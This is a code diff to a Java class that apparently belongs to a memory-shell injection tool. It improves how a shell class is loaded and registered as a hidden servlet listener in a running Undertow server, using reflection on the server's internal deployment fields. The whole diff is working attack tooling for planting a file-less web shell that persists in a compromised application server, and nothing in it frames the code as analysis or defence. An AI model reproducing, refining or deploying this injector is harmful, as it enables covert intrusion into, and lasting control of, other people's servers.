@@ -56,12 +56,18 @@ public class UndertowListenerInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
+            return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -75,15 +81,17 @@ public class UndertowListenerInjector {
 
     public void inject(Object context, Object listener) throws Exception {
         if (isInjected(context)) {
+            System.out.println("listener already injected");
             return;
         }
-        Class<?> listenerInfoClass = Class.forName("io.undertow.servlet.api.ListenerInfo");
+        Class<?> listenerInfoClass = context.getClass().getClassLoader().loadClass("io.undertow.servlet.api.ListenerInfo");
         Object listenerInfo = listenerInfoClass.getConstructor(Class.class).newInstance(listener.getClass());
         Object deploymentImpl = getFieldValue(context, "deployment");
         Object applicationListeners = getFieldValue(deploymentImpl, "applicationListeners");
-        Class<?> managedListenerClass = Class.forName("io.undertow.servlet.core.ManagedListener");
+        Class<?> managedListenerClass = context.getClass().getClassLoader().loadClass("io.undertow.servlet.core.ManagedListener");
         Object managedListener = managedListenerClass.getConstructor(listenerInfoClass, boolean.class).newInstance(listenerInfo, true);
         invokeMethod(applicationListeners, "addListener", new Class[]{managedListenerClass}, new Object[]{managedListener});
+        System.out.println("listener inject success");
     }
 
     public boolean isInjected(Object context) throws Exception {
